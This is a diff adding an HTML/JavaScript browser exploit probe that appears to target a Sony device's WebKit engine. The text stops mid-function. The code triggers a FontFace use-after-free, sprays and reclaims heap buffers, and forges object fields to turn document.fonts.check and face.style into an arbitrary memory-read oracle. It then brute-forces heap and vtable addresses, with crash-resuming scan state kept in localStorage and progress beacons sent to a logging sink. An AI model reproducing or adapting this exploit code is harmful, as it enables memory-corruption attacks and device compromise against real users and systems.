@@ -1,0 +1,2314 @@
+<!--
+  V688 — Path B read-only identity + addrof-certification probe.
+
+  Steps 1-8 (reclaim / walk / arbitrary-read) are behavior-identical to v687;
+  only probe-specific prefixes/keys were renamed v687->v688. No V678 scan
+  remains here: the old ELF/base-scan Step 9 was replaced.
+
+  Step 9 (new, read-only):
+    - Derive BASE=VP-0x724DB28 and expected primary vtable PV=BASE+0x724DAC0
+      as SOURCE CANDIDATES (not assumed truth).
+    - Dump bounded raw data around L2, read FB=qword(L2+8) with a pre-read
+      beacon and canonical-heap plausibility check.
+    - Bounded <=96B read at FB; report every qword. FACE-IDENTITY-OK only if
+      primary vtable==PV, secondary==VP, FB+0x28==L2 and FB+0x30 is self or a
+      separately-reported rationalized mismatch. Any mismatch =>
+      FACE-IDENTITY-FAIL and STOP (no blind further dereference).
+    - Only on certified identity: read candidate proxy pointer at FB+0x38
+      (source-derived candidate m_loadedPromise location, NOT p811 universal
+      proof). Bounded <=96B read at proxy; if proxy+0 is a plausible heap
+      callback-wrapper pointer, bounded <=64B read there and scan qwords for
+      exact FB (captured owner). PROMISE-CALLBACK-OWNER-OK only on exact match.
+    - Optional ?dv=<hex> manual JSDataView candidate cell certification:
+      validates header fields and re-reads each marker at its own address;
+      ADDROF-CERTIFIED only when every check passes. No heap scanning; without
+      dv the target DataView's JSCell is not auto-discovered (ADDROF-PENDING).
+
+  SCOPE / HONESTY: Path B's premise is NOT yet a valid COOP arbitrary write.
+  Sony 1200 DOMPromiseProxyWithResolveCallback::resolve(*this) does not simply
+  store FontFace* in the proxy; native ResolveCallback resolution semantics and
+  a deterministic JSC addrof linkage are still needed, and p812/p813 were
+  source-only. This probe only gathers the next device evidence without
+  risking foreign structures. No vtable forge, no COOP trigger, no m_vector
+  write, no promise-status writes, no executable-text reads (no T1/T2 exec
+  tests / ELF scanning).
+
+  Base shape: gt=1 rv=6 cli=184 kc=1 bk=1 mt=1 pk=9 (all safe) — unchanged
+  CRASH_CLASS: HIGH — unchanged (unmapped candidate = SIGSEGV; the last
+  beacon before a crash marks where the probe died)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>v56 NE census + named swap</title></head>
+<body>
+<div id="verdict" style="position:sticky;top:0;z-index:9;font:700 15px monospace;padding:.5rem;background:#fff4d6;color:#5a4300;border-bottom:2px solid #d7b34a">RUNNING</div>
+<pre id="out">v51</pre>
+<script>
+'use strict';
+var SKIPJ=-1;
+var O=document.getElementById('out');
+var UID=Math.random().toString(36).slice(2,8).toUpperCase();
+
+/* --- beacon infrastructure (sync-XHR POST to host.py's do_POST sink; every
+ * beacon lands in host-beacons.log before a crash. V688: prefix renamed so
+ * runs are separable from V687/P691 logs and never share cache keys. */
+function post(m){
+  try{
+    var x=new XMLHttpRequest();
+    x.open('POST','/beacon/V61-'+encodeURIComponent(m)+'?t='+Date.now()+'&u='+UID,false);
+    x.send('');
+  }catch(e){}
+}
+function b(m){try{O.textContent+='\n'+m;}catch(e){}post(m);}
+function bs(m){post(m);}
+function verd(k,t){var v=document.getElementById('verdict');v.style.background=(k==='ok')?'#e3f5e6':'#fde2e1';v.style.color=(k==='ok')?'#0f5a20':'#8c1010';v.innerHTML=t;}
+
+/* --- query params --- */
+function qint(n,d){var m=new RegExp('[?&]'+n+'=([^&]*)').exec(location.search);return m?parseInt(m[1],10):d;}
+function qhex(n,d){var m=new RegExp('[?&]'+n+'=([0-9a-fA-F]+)').exec(location.search);return m?parseInt(m[1],16):d;}
+var K=qint('k',32), RT=qint('rt',0), PK=qint('pk',9), PW=qint('pw',80), DL=qint('dl',0);
+var GT=qint('gt',0), SI=qint('si',0), RV=qint('rv',6), KC=qint('kc',1), BK=qint('bk',1);
+var MT=qint('mt',1), MP=qint('mp',0), IVP=qint('ivp',0);
+var CLI=qint('cli',184);
+var VB=(function(){var m=/[?&]vb=([0-9a-f]+)/.exec(location.search);return m?parseInt(m[1],16):0x18;})();
+var SV=(function(){var m=location.search.match(/[?&]sv=([^&]*)/);return m?decodeURIComponent(m[1]):'italic';})();
+var CTL=qint('ctl',0), AUTO=qint('auto',0);
+var LK=qint('lk',1);
+/* V688 optional manual JSDataView candidate cell (hex, no 0x needed) */
+var DVQ=(function(){var m=/[?&]dv=([0-9a-fA-F]+)/.exec(location.search);return m?BigInt('0x'+m[1]):0n;})();
+
+var SIZE=192, fired=false, faces=null, RTT=0;
+
+/* --- primitives --- */
+function le(v,o){var x=0n;for(var k=7;k>=0;k--)x=(x<<8n)|BigInt(v[o+k]);return x;}
+function put64(u,o,x){for(var k=0;k<8;k++){u[o+k]=Number((x>>BigInt(8*k))&0xFFn);}}
+function put32(u,o,x){u[o]=x&0xFF;u[o+1]=(x>>>8)&0xFF;u[o+2]=(x>>>16)&0xFF;u[o+3]=(x>>>24)&0xFF;}
+function hex(x){return '0x'+x.toString(16);}
+
+/* --- V688 marker buffers (allocated BEFORE the UAF start, never freed,
+ * contents frozen after marker init). V11: a SPRAY of 32 identical 0x100-byte
+ * marker buffers (buffer[0] keeps the original view contract for the ?dv=
+ * certification). Each carries the six original marker qwords PLUS the
+ * PH3-pattern qword 0x0000200000001000 at +0x88 and +0xB8 — findable with
+ * the proven 4-way oracle test (chk 0x1000/0xFFF/0x2000/0x2001). */
+var __v688buf=null,__v688view=null,__v688hold=[],__v688spray=[],__v688views=[];
+function dvSetBig(v,off,val){
+  if(typeof v.setBigUint64==='function'){v.setBigUint64(off,val,true);return;}
+  var lo=Number(val&0xFFFFFFFFn)>>>0,hi=Number((val>>32n)&0xFFFFFFFFn)>>>0;
+  v.setUint32(off,lo,true);v.setUint32(off+4,hi,true);
+}
+function dvGetBig(v,off){
+  if(typeof v.getBigUint64==='function')return v.getBigUint64(off,true);
+  var lo=BigInt(v.getUint32(off,true)>>>0),hi=BigInt(v.getUint32(off+4,true)>>>0);
+  return lo|(hi<<32n);
+}
+(function initV688Markers(){
+  try{
+    var PAT=0x0000200000001000n;
+    for(var si=0;si<32;si++){
+      var ab=new ArrayBuffer(0x100);
+      var full=new DataView(ab);
+      dvSetBig(full,0x18,0x55AA33CC0FF0E11En);  /* marker C (view-0x08) */
+      dvSetBig(full,0x20,0x13579BDF02468ACEn);  /* marker A (view data start) */
+      dvSetBig(full,0x58,0x2468ACE013579BDFn); /* marker B (view+0x38) */
+      dvSetBig(full,0x60,0x0D15EA5EC001D00Dn); /* marker D */
+      dvSetBig(full,0x00,0xDEADBEEFCAFEBABEn);  /* marker E */
+      dvSetBig(full,0xF8,0x0123456789ABCDEFn);  /* marker F */
+      dvSetBig(full,0x90,PAT);                  /* V15: 0x88/0xB8 aliased the SELF scan's
+                                                  +0x38 probe (0x88-0x38=0x50, on-grid) → fake
+                                                  SELF=marker+0x50 killed the walk (v12-v14).
+                                                  0x90/0xC0 put the alias targets off-grid
+                                                  (0x58/0x88 mod 16 = 8) — no cross-matches. */
+      dvSetBig(full,0xC0,PAT);
+      dvSetBig(full,0x48,0xAA00000000n|BigInt(si)); /* V16: buffer index tag — identifies which
+                                                  spray[i] lives at a given address */
+      /* V14 calibration bytes. Oracle semantics (device-decoded across
+       * PH3/CAL1/CALA): chk(c)=TRUE iff A<=c<=B where (A,B)=the two uint32s
+       * at the probe address; inverted (A>B) => always FALSE. A JSDataView
+       * cell exposes these probeable windows:
+       *   +0x14: (V.b4, 0x40)  — V.b4 = band byte-4 (dynamic, from MBUF) — PRIMARY, both edges pinned
+       *   +0x1C: (0, 0x20)     — length-tail + byteOffset — SECONDARY, B edge pinned
+       *   +0x18: (0x40, 0)     — inverted => all-F — TERTIARY filter
+       * +0x98 is planted DYNAMICALLY after MBUF is known (boot-proof); the
+       * others are V-independent constants. */
+      dvSetBig(full,0x98,0x0000004000000010n);   /* placeholder — overwritten at runtime with V.b4 */
+      dvSetBig(full,0xA0,0x0000000000000040n);   /* +0x18 window: qword 0x40 */
+      dvSetBig(full,0xA8,0x0000002000000000n);   /* +0x1C window: bytes 00 00 00 00 20 00 00 00 */
+      var vw=new DataView(ab,0x20,0x40);         /* every buffer gets a view: any of the 32 cells is a valid addrof target */
+      __v688views.push(vw);
+      __v688spray.push(ab);
+      if(si===0){__v688buf=ab;__v688view=new DataView(ab,0x20,0x40);__v688hold=[ab,__v688view,full];}
+    }
+    window.__v688={buf:__v688buf,view:__v688view,full:new DataView(__v688buf),hold:__v688hold,spray:__v688spray,views:__v688views};
+  }catch(e){__v688buf=null;__v688view=null;}
+})();
+
+/* --- localStorage reset ---
+ * reset=1 clears ALL probe state (p691*, v687*, v688*).
+ * soft=1 clears only this probe's scan cursor/pass/phase/base (fresh scan,
+ * chain caches kept). V687's own cursor keys are untouched by soft so
+ * switching back to the old probe is possible. */
+if(/[?&]reset=1/.test(location.search)){
+  try{var ks=Object.keys(localStorage);for(var ri=0;ri<ks.length;ri++){var kk=ks[ri];if(kk.indexOf('p691')===0||kk.indexOf('v687')===0||kk.indexOf('v688')===0)localStorage.removeItem(kk);}}catch(e){}
+  b('RESET-FULL');document.body.innerHTML='<p style="font:700 26px monospace">v688 reset</p>';
+}
+else if(/[?&]soft=1/.test(location.search)){
+  try{['off','dir','exp'].forEach(function(sk){localStorage.removeItem('v688_'+sk);});}catch(e){}
+  b('SOFT');document.body.innerHTML='<p style="font:700 26px monospace">sift state cleared</p>';
+}
+else { b('VER-2'); b('BOOT-'+UID+',ctl='+CTL); }
+
+/* --- spray + UAF trigger --- */
+function start(){
+  var vf;try{vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});}catch(e){b('NOVF');return;}
+  try{document.fonts.add(vf);}catch(e){}
+  try{window.__alive=[vf];}catch(e){}   /* keep the JS wrapper alive while the engine frees the backend */
+  try{void vf.loaded;}catch(e){}
+  var fs=document.createElement('style');
+  fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(fs);
+
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    if(!CTL){try{fs.remove();fs.textContent='';}catch(e){}try{document.fonts.delete(this);}catch(e){}}
+    try{document.body.offsetHeight;}catch(e){}
+    window.__sp=[];
+    for(var k=0;k<K;k++){
+      var w=new Uint8Array(new ArrayBuffer(SIZE));
+      w[0x82]=3;
+      w[0]=0;w[1]=0;w[2]=0;w[3]=0x80;
+      var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;w[6]=0;w[7]=0;
+      window.__sp.push(w);
+    }
+    /* size-ladder buffers are reclaim pressure ONLY — they are NOT in __sp
+     * (chain geometry assumes 192B). */
+    window.__ladder=[];
+    var LAD=[64,96,128,160,224,256,320,384,512,768,1024,2048];
+    for(var la=0;la<LAD.length;la++)for(var lb=0;lb<8;lb++)window.__ladder.push(new Uint8Array(new ArrayBuffer(LAD[la])));
+    try{document.fonts.check('1em v1');}catch(e){}   /* consumption — critical on this boot */
+    return undefined;
+  },set:function(){}});
+
+  document.fonts.load('1em vf, v1','AB').then(function(f){faces=f;b('RES-n'+f.length);setTimeout(tryPhase,60);},
+                                               function(e){b('RJ-'+String(e&&e.name));});
+  setTimeout(function(){if(!faces)b('NOFACES');},1500);
+}
+
+/* multi-timing leak retry: on this boot the reclaim lands at a variable
+ * delay; scan at the usual cadence before declaring NOLEAK. Also beacons the
+ * fired/alive state so a NOLEAK distinguishes "getter never fired" from
+ * "reclaim missed". */
+var leakTries=0,RETRY=[0,80,260,300,300];
+function leakHit(){
+  for(var i=0;i<window.__sp.length;i++){if(le(window.__sp[i],0x58)>0x1000000000n)return true;}
+  return false;
+}
+function tryPhase(){
+  if(faces&&window.__sp&&leakHit()){b('LEAK-CONFIRMED-'+leakTries);setTimeout(phase,PW);return;}
+  if(leakTries<RETRY.length-1){b('SCAN-RETRY-'+leakTries+'-fired-'+(fired?1:0)+'-sp-'+((window.__sp&&window.__sp.length)||0));leakTries++;setTimeout(tryPhase,RETRY[leakTries]);return;}
+  b('L1-0x0');b('L2-0x0');b('NOLEAK');verd('bad','NOLEAK');
+}
+
+/* --- main analysis chain --- */
+function phase(){
+  var bufs=[],bufl1=[],L1=0n,L2=0n,rawL=null,cands=[];
+  if(RT>0){RTT=setTimeout(function(){location.href=location.href.replace(/([?&])rt=\d+/,'$1rt='+(RT-1));},30000);}
+
+  /* Step 1: hit detection + leak L1/L2 */
+  for(var i=0;i<window.__sp.length;i++){
+    var a=le(window.__sp[i],0x58),c=le(window.__sp[i],0x68);
+    if(a>0x1000000000n){bufs.push([window.__sp[i],c]);cands.push([window.__sp[i],c]);bufl1.push(a);if(!rawL)rawL=[a,c];}
+  }
+  if(rawL){L1=rawL[0];L2=rawL[1];}
+  b('L1-'+hex(L1));b('L2-'+hex(L2));
+  if(!bufs.length||L2===0n){b('NOLEAK');verd('bad','NOLEAK');return;}
+
+  /* Step 2: initial forge — set refcount, copy L2, clear status */
+  for(var ib=0;ib<bufs.length;ib++){var vb=bufs[ib][0];vb[0]=2;put64(vb,0x08,bufs[ib][1]);vb[0x10]=0;vb[0x82]=0;}
+  b('FORGED-'+bufs.length);
+
+  /* Step 3: re-add faces, find oracle face (setTimeout chain) */
+  setTimeout(function(){
+    for(var i2=0;i2<faces.length;i2++){try{faces[i2].family='zz'+i2;}catch(e){}}
+    b('FAMILY-OK');
+    setTimeout(function(){
+      for(var i3=0;i3<faces.length;i3++){try{document.fonts.add(faces[i3]);}catch(e){}}
+      b('ADD-OK');
+      setTimeout(function(){
+        var fam=null,zi=-1;
+        for(var q=0;q<faces.length;q++){var r=null;try{r=document.fonts.check('1em zz'+q,'A');}catch(e){}if(r===false){fam='zz'+q;zi=q;window.__zi=q;break;}}
+        b('INTABLE-'+fam);
+        if(!fam){b('NOTIN');verd('bad','NOTIN');return;}
+
+        /* set ranges count/capacity on all hit buffers */
+        for(var is=0;is<bufs.length;is++){bufs[is][0][0x28]=1;bufs[is][0][0x2C]=1;}
+
+        /* --- oracle functions --- */
+        var self=0n,selfFound=false;
+
+        function setR(t){for(var ir=0;ir<bufs.length;ir++){if(SKIPJ>=0&&bufs[ir][0]===window.__sp[SKIPJ])continue;put64(bufs[ir][0],0x20,t);}}
+        function chk(c){try{return document.fonts.check('1em '+fam,String.fromCodePoint(c))===false;}catch(e){return null;}}
+        function boundary(tgt){
+          setR(tgt);
+          if(chk(0)!==true)return -1;
+          var lo=0,hi=0x10FFFF,res=-1;
+          while(lo<=hi){var mid=(lo+hi)>>1;var r=chk(mid);if(r===null)break;if(r===true){res=mid;lo=mid+1;}else hi=mid-1;}
+          return res;
+        }
+
+        /* --- style-read mechanism --- */
+        function forgeRead(daddr,dlen){
+          for(var ib2=0;ib2<window.__sp.length;ib2++){
+            var vb2=window.__sp[ib2];if(!vb2)continue;
+            if(SKIPJ>=0&&ib2===SKIPJ)continue;
+            if(selfFound){put64(vb2,0x08,self+0x70n);vb2[0x10]=0;}
+            put32(vb2,0x30,4);put32(vb2,0x34,dlen);put64(vb2,0x38,daddr);put32(vb2,0x40,4);
+            vb2[0x44]=0x7A;vb2[0x45]=0x7A;vb2[0x46]=0x71;
+            put32(vb2,0x70,4);
+            put32(vb2,0x74,0x10);vb2[0x78]=14;vb2[0x79]=0;
+            if(selfFound)put64(vb2,0x7A,self+0x90n);
+            put32(vb2,0x90,3);put32(vb2,0x94,72);
+            if(selfFound)put64(vb2,0x98,self+0x30n);
+          }
+        }
+        function dec(s,lim){
+          var by=[],q2=(s.charAt(0)==='"')?1:0,e=(s.slice(-1)==='"')?s.length-1:s.length,k=q2;
+          while(k<e&&by.length<lim){var ch=s.charAt(k);
+            if(ch==='\\'){k++;var hh='';while(k<e&&hh.length<6&&/[0-9a-fA-F]/.test(s.charAt(k))){hh+=s.charAt(k);k++;}
+              if(hh.length===0){if(k<e){by.push(s.charCodeAt(k));k++;}}
+              else{if(s.charAt(k)===' ')k++;var cp=parseInt(hh,16);if(cp>255)cp&=0xFF;by.push(cp);}}
+            else{by.push(s.charCodeAt(k));k++;}}
+          var h='';for(var j=0;j<by.length;j++)h+=('0'+by[j].toString(16)).slice(-2);return h;
+        }
+        function readStyle(){
+          if(zi<0)return '';
+          try{return dec(String(faces[zi].style),128);}catch(e){return 'THROW';}
+        }
+        function readLeHex(hexStr,off){
+          var s=hexStr.slice(off*2,off*2+16);
+          if(!/^[0-9a-f]{16}$/.test(s))return 0n;
+          return BigInt('0x'+s.match(/../g).reverse().join(''));
+        }
+
+        /* --- Step 4: oracle validation --- */
+        var t1=-1,l2i=-1;
+        b('DIAG-bufs='+bufs.length+',fam='+fam+',zi='+zi);
+        for(var q8=0;q8<bufs.length;q8++){
+          L1=bufl1[q8];L2=bufs[q8][1];
+          var dCnt=bufs[q8][0][0x28],dCap=bufs[q8][0][0x2C];
+          b('DIAG-q'+q8+'-L2='+hex(L2)+',cnt='+dCnt+',cap='+dCap);
+          setR(L2+0x07n);
+          var dc0=chk(0),dc1=chk(0x41),dc2=chk(0x100);
+          b('DIAG-q'+q8+'-chk0='+dc0+',chk41='+dc1+',chk100='+dc2);
+          var d20=hex(le(bufs[q8][0],0x20));
+          b('DIAG-q'+q8+'-ptr20='+d20);
+          t1=boundary(L2+0x07n);
+          if(t1>=0){l2i=q8;break;}
+        }
+        if(l2i>0)b('L2SEL-'+l2i);
+        if(l2i<0){L1=bufl1[0];L2=bufs[0][1];}
+
+        var oracleAlive=(t1>=0);
+        if(!oracleAlive){
+          b('A-DEAD');
+          for(var ipd=0;ipd<bufs.length;ipd++){var vpd=bufs[ipd][0];
+            vpd[0x38]=0x00;vpd[0x39]=0x10;vpd[0x3A]=0x00;vpd[0x3B]=0x00;
+            vpd[0x3C]=0x00;vpd[0x3D]=0x20;vpd[0x3E]=0x00;vpd[0x3F]=0x00;}
+        }
+        /* readStyle() without selfFound poisons the WeakPtrImpl backing,
+           causing all subsequent face.style calls to return "normal" instead
+           of binary data from the forged address. */
+
+        var t2=-1,c0=false;
+        if(oracleAlive){
+          b('HIGH-0x'+t1.toString(16));
+          t2=boundary(L2+0x06n);
+          if(t2<0){b('B-DEAD');}else{b('B2-0x'+(t2&0xFF).toString(16));}
+          setR(L2+0x05n);
+          c0=chk(0);
+          b('B0CLASS-'+(c0===true?'lo-hi':(c0===false?'mid':'?')));
+        }
+
+        /* --- Step 5: Phase 2 — Client scan --- */
+        var B2=BigInt((t2>=0)?(t2&0xFF):Number((L2>>16n)&0xFFn));
+        var B2L=Number((L2>>16n)&0xFFn);
+        var fromExp=BigInt(B2L)|0x100000n;
+        var B0s=(c0===false)?[0x10,0x20,0x30,0x40,0x50,0x60,0x70]:[0x00,0x80,0x90,0xa0,0xb0,0xc0,0xd0,0xe0,0xf0];
+        var found=0n,ntry=0;
+        b('PH2-START-b0='+B0s.length);
+
+        try{var pv=BigInt('0x'+(localStorage.getItem('v688_cli')||'0'));
+          if(pv>0x1000000000n){setR(pv+0x0Bn);if(chk(0x1000)===true&&chk(0xFFF)===false){found=pv;b('CLIENT-CACHED-0x'+pv.toString(16));}}}catch(e){}
+
+        var b1L=Number((L2>>8n)&0xFFn);
+        var ST=null;try{ST=JSON.parse(localStorage.getItem('v688_st')||'null');}catch(e){}
+        var startI=0;
+        if(ST&&ST.B2===Number(B2)&&ST.b1L===b1L&&ST.c0===(c0===false)){
+          startI=(ST.i|0);if(startI>4)startI-=4;b('PH2-RESUME-'+startI);
+        }else{b('PH2-FRESH');startI=0;try{localStorage.setItem('v688_st',JSON.stringify({B2:Number(B2),b1L:b1L,c0:(c0===false),i:0}));}catch(e){}}
+
+        var B1s=[];for(var q1=0;q1<256;q1++)B1s.push(q1);
+        B1s.sort(function(x,y){return Math.abs(x-b1L)-Math.abs(y-b1L);});
+
+        if(found===0n&&oracleAlive){
+          for(var i5=0;i5<B0s.length;i5++){
+            var brk=false;
+            for(var q2b=0;q2b<256;q2b++){
+              var b1=B1s[q2b];
+              var cand=BigInt(B0s[i5])|(BigInt(b1)<<8n)|(B2<<16n)|(0x10n<<32n);
+              if(ntry<startI){ntry++;continue;}
+              setR(cand+0x0Bn);ntry++;
+              if((ntry&7)===0){try{localStorage.setItem('v688_st',JSON.stringify({B2:Number(B2),b1L:b1L,c0:(c0===false),i:ntry}));}catch(e){}}
+              if(chk(0x1000)===true&&chk(0xFFF)===false){
+                setR(cand+0x0An);
+                var s1=chk(Number(fromExp&0x1FFFFFn));
+                b('CAND-0x'+cand.toString(16)+',s1='+s1);
+                if(s1===true){found=cand;brk=true;break;}
+              }
+              if((ntry%64)===0)b('PH2-'+ntry);
+            }
+            if(brk)break;
+          }
+        }
+        b('PH2-END-ntry='+ntry);
+        if(!found){
+          if(oracleAlive){b('NOCLIENT');try{localStorage.removeItem('v688_st');}catch(e){}verd('bad','NOCLIENT');return;}
+          /* A-DEAD is the NORMAL path (all morning sessions ran it): the
+           * boundary read at L2+7 fails but chk() is alive — PH3 finds self
+           * via the planted 0x1000/0x2000 pattern. Do NOT return here. */
+          b('PH2-SKIP-DEAD');
+        }else{
+          try{localStorage.removeItem('v688_st');}catch(e){}
+          try{localStorage.setItem('v688_cli',found.toString(16));}catch(e){}
+          b('CLIENT-0x'+found.toString(16));
+        }
+
+        /* --- Step 6: Phase 3 — Self scan --- */
+        for(var ip=0;ip<bufs.length;ip++){var vp=bufs[ip][0];
+          vp[0x38]=0x00;vp[0x39]=0x10;vp[0x3A]=0x00;vp[0x3B]=0x00;
+          vp[0x3C]=0x00;vp[0x3D]=0x20;vp[0x3E]=0x00;vp[0x3F]=0x00;}
+
+        if(!selfFound&&found){
+          setR(found+0x48n);
+          if(chk(0x1000)===true&&chk(0xFFF)===false&&chk(0x2000)===true&&chk(0x2001)===false){
+            self=found+0x10n;selfFound=true;b('SELF-DER-0x'+self.toString(16));
+          }
+        }
+
+        /* --- cached-self fast path: SELF is stable across sessions on a boot
+         * (morning log: 0x1000380000 x7). Try the cached address + 16K
+         * neighbors first — the 4-way pattern (planted bytes 0x1000/0x2000 in
+         * the hit buffer) is the verification. CRASH ESCAPE: a stale cache
+         * from a previous boot can point at unmapped memory → the probe
+         * crashes the session. v688_selftries counts attempts; after 3
+         * failed/crashed attempts the cache is bypassed until a new SELF
+         * overwrites it. */
+        if(!selfFound){
+          try{
+            var cs=BigInt('0x'+(localStorage.getItem('v688_self')||'0'));
+            var csT=parseInt(localStorage.getItem('v688_selftries')||'0',10);
+            if(cs>0x1000000000n&&csT<3){
+              try{localStorage.setItem('v688_selftries',String(csT+1));}catch(e2){}
+              var cs5=[cs,cs+0x4000n,cs-0x4000n,cs+0x8000n,cs-0x8000n];
+              for(var ci5=0;ci5<cs5.length;ci5++){
+                var csc=cs5[ci5];
+                if(csc<=0x1000000000n)continue;
+                setR(csc+0x38n);
+                if(chk(0x1000)===true&&chk(0xFFF)===false&&chk(0x2000)===true&&chk(0x2001)===false){
+                  self=csc;selfFound=true;b('SELF-CACHED-0x'+csc.toString(16));break;
+                }
+              }
+            }
+          }catch(e){}
+        }
+
+        if(!selfFound){
+          var b2Ref=(found>0n)?Number((found>>16n)&0xFFn):Number((L2>>16n)&0xFFn);
+          var b4Ref=(found>0n)?Number((found>>32n)&0xFFn):Number((L2>>32n)&0xFFn);
+          var B4s=[b4Ref];
+          var b4low=[];for(var ql=0x01;ql<=0x07;ql++)b4low.push(ql);
+          var b4all=b4low.concat([0x10,0x08]);
+          for(var q8b=0x09;q8b<=0x0F;q8b++)b4all.push(q8b);
+          for(var q9=0x11;q9<=0x1F;q9++)b4all.push(q9);
+          for(var qw=0;qw<b4all.length;qw++){if(b4all[qw]!==b4Ref)B4s.push(b4all[qw]);}
+
+          /* V9 FULL-B1 GRID: the old grid covered b1 ∈ [0,0x7E] only — HALF
+           * the byte. Morning SELF had b1=0x00 (page-start chunk, lucky);
+           * boots B-E scanned clean and never found SELF because its b1 was
+           * likely > 0x7E — structurally invisible. Full grid: b2 window ×
+           * b1 ∈ [0,0xFF] × b0 (16-aligned) = 4096/window. ~905K tries over
+           * the safe band ≈ 9s at this boot's ~100K/sec scan rate — fits in
+           * one session lifetime (~14s deferred-crash ceiling). */
+          var b2s=[];for(var q5=0;q5<256;q5++)b2s.push(q5);
+          b2s.sort(function(x,y){return Math.abs(x-b2Ref)-Math.abs(y-b2Ref);});
+
+          
+          var b0a=[];for(var q6=0;q6<16;q6++)b0a.push(q6*16);
+
+          var dead=[];try{dead=JSON.parse(localStorage.getItem('v688_dead')||'[]');}catch(e){}
+          var s3=null;try{s3=JSON.parse(localStorage.getItem('v688_s3')||'null');}catch(e){}
+          /* 'dead' resume key is session-INDEPENDENT (L2 changes every session
+           * so the old L2-based key never matched — scans always restarted at
+           * 0). The b2Ref ordering is stable (L2 byte2 is 0x7e across
+           * sessions), so cross-session resume converges under crash churn. */
+          var resumeKey=(found>0n)?('cli'+found.toString(16)):'dead3';
+          var PH3_BOUND=2200000;  /* ~4 regions: b4Ref, 0x01, 0x02, 0x03 — the two plausible SELF families first */
+          /* CRASH-TUNNELING RESUME: there is a persistent unmapped hole at
+           * b2-window ~220 (~449K, observed on boots B and C) — the engine
+           * dereferences sc+0x38 there → SIGSEGV. Resume one FULL WINDOW
+           * past the last saved cursor: the window the previous session died
+           * in is never probed again. Each crash advances the cursor; the
+           * scan tunnels through any wall in ~1 session per bad window. */
+          var st3=0;
+          if(s3&&s3.cli===resumeKey){st3=(s3.i|0)+4096;   /* V9 window size */if(st3>=PH3_BOUND){st3=0;}else b('PH3-ADVANCE-'+st3);}
+          var n3=0,WSZ=(0x100*16);   /* V9: 256 b1 x 16 b0 = 4096 per window */
+          b('PH3-START-b4='+B4s[0]+'-bound='+PH3_BOUND);
+
+          var ph3HitBound=false,nullStreak=0;
+          for(var i8=0;i8<B4s.length&&!selfFound&&!ph3HitBound;i8++){
+            for(var i7=0;i7<b2s.length&&!selfFound;i7++){
+              var winB2=b2s[i7];
+              if(dead.indexOf(B4s[i8]*1000+winB2)>=0){n3+=WSZ;continue;}
+              if(st3>n3+WSZ){n3+=WSZ;continue;}
+              if(n3>=PH3_BOUND){ph3HitBound=true;b('PH3-BOUND-'+n3);break;}
+              for(var q7=0;q7<0x100&&!selfFound;q7++){
+                for(var i6=0;i6<b0a.length&&!selfFound;i6++){
+                  var sc=BigInt(b0a[i6])|(BigInt(q7)<<8n)|(BigInt(winB2)<<16n)|(BigInt(B4s[i8])<<32n);
+                  if(n3<st3){n3++;continue;}
+                  setR(sc+0x38n);n3++;
+                  if((n3&31)===0){try{localStorage.setItem('v688_s3',JSON.stringify({cli:resumeKey,i:n3}));}catch(e){}}
+                  if(n3>=1048576&&!window.__r0done){window.__r0done=true;b('PH3-R0-CLEAN-'+n3);}   /* V9: 256 win x 4096 */
+                  /* true pathology detector: chk() throwing (null) under
+                   * engine distress can never match — abort instead of
+                   * scanning the whole space (IIFJUV 449K futile case) */
+                  var r1=chk(0x1000);
+                  if(r1===null){nullStreak++;if(nullStreak>200){b('PH3-CHKBROKEN-'+n3);ph3HitBound=true;break;}}else nullStreak=0;
+                  if(r1===true&&chk(0xFFF)===false&&chk(0x2000)===true&&chk(0x2001)===false){
+                    self=sc;selfFound=true;
+                  }
+                  if((n3%2048)===0)b('PH3-'+n3);
+                }
+              }
+            }
+          }
+        }
+
+        if(!selfFound){b('NOSELF');verd('bad','NOSELF');return;}
+        b('SELF-0x'+self.toString(16));
+        try{localStorage.setItem('v688_self',self.toString(16));localStorage.setItem('v688_selftries','0');}catch(e){}
+        if(RTT){clearTimeout(RTT);RTT=0;}
+        try{localStorage.removeItem('v688_s3');localStorage.removeItem('v688_dead');}catch(e){}
+
+        for(var iv=0;iv<window.__sp.length;iv++){
+          if(le(window.__sp[iv],0x58)>0x1000000000n)continue;
+          var wv=window.__sp[iv],mk=0x1000+iv;
+          wv[0x40]=0;wv[0x41]=0;wv[0x42]=0;wv[0x43]=0;
+          wv[0x44]=mk&0xFF;wv[0x45]=(mk>>8)&0xFF;wv[0x46]=0;wv[0x47]=0;
+        }
+
+        /* --- Step 7: VTAB search --- */
+        var VTAB=0n;
+        for(var sv=1;sv<=256&&VTAB===0n;sv++){
+          var cd=self-BigInt(sv*64);
+          setR(cd);
+          if(chk(0x1000)===true&&chk(0x1001)===false){
+            var jj=Number(boundary(cd))-0x1000;
+            if(jj>=0&&jj<K){VTAB=cd;SKIPJ=jj;b('VTAB-0x'+cd.toString(16)+'-j'+jj);break;}
+          }
+        }
+        if(VTAB===0n){
+          for(var sv2=1;sv2<=256&&VTAB===0n;sv2++){
+            var cu=self+BigInt(sv2*64);
+            setR(cu);
+            if(chk(0x1000)===true&&chk(0x1001)===false){
+              var jj2=Number(boundary(cu))-0x1000;
+              if(jj2>=0&&jj2<K){VTAB=cu;SKIPJ=jj2;b('VTAB-0x'+cu.toString(16)+'-j'+jj2);break;}
+            }
+          }
+        }
+        if(VTAB===0n)b('VTAB-NONE');
+
+        /* ==== V11 STEP 7.5: marker-buffer scan (chk alive, pre-DEL) ====
+         * 32 identical marker buffers sprayed at init, each with the PH3
+         * pattern qword at +0x88 and +0xB8. Try cached-B first, then a
+         * 0x100-aligned fast pass over the mapped band INTERIOR (b2
+         * 0x20-0xDB — never the edges: unmapped → crash), auto-upgrade to
+         * the full 16B grid via v688_mfull if the fast pass is clean. */
+        var MBUF=0n;
+        var mRef=Number((L2>>16n)&0xFFn), m4=Number((L2>>32n)&0xFFn);
+        function mPat(a){setR(a);return chk(0x1000)===true&&chk(0xFFF)===false&&chk(0x2000)===true&&chk(0x2001)===false;}
+        try{
+          var mB=BigInt('0x'+(localStorage.getItem('v688_buf')||'0'));
+          if(mB>0x1000000000n&&mPat(mB+0x90n)&&mPat(mB+0xC0n)){MBUF=mB;bs('MBUF-CACHED-0x'+mB.toString(16));}
